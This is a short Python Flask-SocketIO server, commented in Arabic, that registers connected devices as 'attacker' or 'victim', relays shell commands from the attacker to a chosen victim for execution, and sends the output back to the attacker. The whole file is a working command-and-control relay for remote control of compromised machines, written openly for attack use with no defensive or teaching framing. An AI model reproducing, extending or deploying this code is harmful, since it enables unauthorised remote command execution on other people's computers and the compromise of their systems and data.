from flask import Flask, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# تخزين الاتصالات
clients = {} # {sid: role}

@socketio.on('connect')
def handle_connect():
    print(f"اتصال جديد: {request.sid}")

@socketio.on('register')
def handle_register(data):
    clients[request.sid] = data['role'] # role: 'attacker' or 'victim'
    print(f"الجهاز {request.sid} سجل كـ {data['role']}")

@socketio.on('send_command')
def handle_command(data):
    # إرسال الأمر للضحية
    emit('execute', {'cmd': data['cmd']}, to=data['target_id'])

@socketio.on('result')
def handle_result(data):
    # إرسال النتيجة للمهاجم (نبحث عن الـ SID الخاص بالمهاجم)
    for sid, role in clients.items():
        if role == 'attacker':
            emit('output', {'result': data['res'], 'from': request.sid}, to=sid)

if __name__ == '__main__':
    socketio.run(app)
